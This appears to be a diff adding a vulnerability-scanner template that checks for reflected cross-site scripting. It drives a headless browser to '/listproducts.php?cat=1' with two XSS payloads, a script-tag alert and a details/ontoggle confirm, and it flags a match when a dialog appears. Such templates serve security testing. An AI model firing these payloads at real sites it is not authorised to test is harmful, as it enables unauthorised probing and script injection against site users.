@@ -1,0 +1,39 @@
+id: headless-reflected-xss
+
+info:
+  name: Reflected Headless XSS
+  author: yar0v1t
+  severity: high
+  description: |
+    A cross-site scripting (XSS) vulnerability with headless mode and pitchfork attack.
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}{{path}}{{payload}}"
+      - action: waitdialog
+        name: reflected_text_query
+        args:
+          max-duration: 10s
+
+    attack: pitchfork
+    payloads:
+      path:
+        - "/listproducts.php?cat=1"
+        - "/listproducts.php?cat=1"
+      payload:
+        - "<%2Fscript><script>alert%283%2B4%29<%2Fscript>"
+        - "'>'><details/open/ontoggle=confirm('XSS')>"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_text_query == true
+
+    extractors:
+      - type: dsl
+        dsl:
+          - reflected_text_query_type
+          - reflected_text_query_message
